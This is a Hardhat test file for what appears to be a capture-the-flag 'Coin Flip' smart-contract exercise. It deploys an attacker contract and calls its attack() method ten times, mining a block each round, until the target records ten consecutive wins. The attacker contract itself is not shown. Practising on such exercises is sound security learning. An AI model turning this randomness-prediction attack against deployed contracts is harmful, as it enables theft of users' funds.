const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Coin Flip', function () {
    let deployer, attacker;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const CoinFlipFactory = await ethers.getContractFactory('CoinFlip', deployer);
        this.coinFlip = await CoinFlipFactory.deploy();
    });

    it('Exploit', async function () {
        const AttackerCoinFlipFactory = await ethers.getContractFactory('CoinFlipAttacker', attacker);
        this.attackerCoinFlip = await AttackerCoinFlipFactory.deploy();

        for(let i = 0; i < 10; i++) {
            await this.coinFlip.consecutiveWins()
            await this.attackerCoinFlip.attack(this.coinFlip.address)
            await ethers.provider.send("hardhat_mine", ["0x1"]);
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await this.coinFlip.consecutiveWins()
        ).to.be.eq(10);
    });
});